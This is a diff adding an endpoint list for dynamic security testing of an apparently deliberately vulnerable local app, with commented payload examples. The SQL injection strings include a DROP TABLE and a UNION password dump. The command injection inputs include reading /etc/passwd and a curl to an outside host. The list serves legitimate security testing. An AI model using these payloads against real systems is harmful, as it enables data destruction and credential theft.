@@ -1,0 +1,20 @@
+# DevSecOpsApp Endpoints for Dynamic Testing
+# Format: METHOD URL DESCRIPTION
+
+GET http://localhost:8080/swagger/index.html Swagger UI
+GET http://localhost:8080/WeatherForecast Weather Forecast endpoint
+POST http://localhost:8080/api/login User login endpoint (SQL Injection target)
+POST http://localhost:8080/api/command/execute Command execution endpoint (Command Injection target)
+
+# Payload examples for SQL Injection testing
+# POST /api/login
+# {"username": "admin' OR '1'='1", "password": "anything"}
+# {"username": "admin'; DROP TABLE Users; --", "password": "anything"}
+# {"username": "admin' UNION SELECT password FROM Users --", "password": "anything"}
+
+# Payload examples for Command Injection testing
+# POST /api/command/execute
+# {"command": "id"}
+# {"command": "whoami"}
+# {"command": "cat /etc/passwd"}
+# {"command": "curl http://example.com"}
